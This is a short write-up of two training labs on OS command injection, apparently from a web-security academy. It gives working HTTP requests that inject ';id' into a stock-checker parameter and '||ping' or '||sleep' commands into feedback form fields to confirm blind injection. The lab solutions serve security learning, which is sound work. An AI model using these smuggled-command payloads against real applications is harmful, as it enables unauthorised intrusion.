
# Lab 1

## Description

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.


## Solution

As the description suggest:

```
POST /product/stock HTTP/2
[...]

productId=1&storeId=1;id
```

returns:

```
uid=12001(peter-ERag1N) gid=12001(peter) groups=12001(peter)
```

solves the lab.


# Lab 2

## Description

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

## Solution

Using the feedback POST request:

```
POST /feedback/submit HTTP/2
[...]

csrf=7ACQETOa1FoycnLh0VmZYDgCgbpxqwSK&name=wer||ping+-c+10+127.0.0.1||&email=werewr%40ewrt.ere||ping+-c+10+127.0.0.1||&subject=wer||ping+-c+10+127.0.0.1||&message=wer||ping+-c+10+127.0.0.1||
```

shows a delay of `9.4` seconds which is close enough and solve the lab.

**NOTE:** The following works as well:

```
csrf=7ACQETOa1FoycnLh0VmZYDgCgbpxqwSK&name=wer||sleep+10||&email=werewr%40ewrt.ere||sleep+10||&subject=wer||sleep+10||&message=wer||sleep+10||
```

but the same payload schema as in lab 1 didn't work (`;sleep+10`).